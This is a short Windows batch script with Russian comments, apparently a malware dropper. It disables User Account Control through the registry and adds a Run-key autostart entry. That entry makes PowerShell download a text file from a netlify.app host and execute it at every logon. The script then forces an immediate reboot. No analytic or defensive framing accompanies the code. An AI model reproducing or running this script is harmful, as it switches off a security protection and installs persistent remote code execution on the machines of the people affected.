@echo off
:: 1
reg.exe ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

:: Добавление команды PowerShell в автозапуск
echo 2
reg.exe ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AutoRunCommand /t REG_SZ /d "powershell -c irm regappdata.netlify.app/zzz.txt | iex" /f

:: Сообщение и перезагрузка системы
echo 3
pause
shutdown /r /t 0
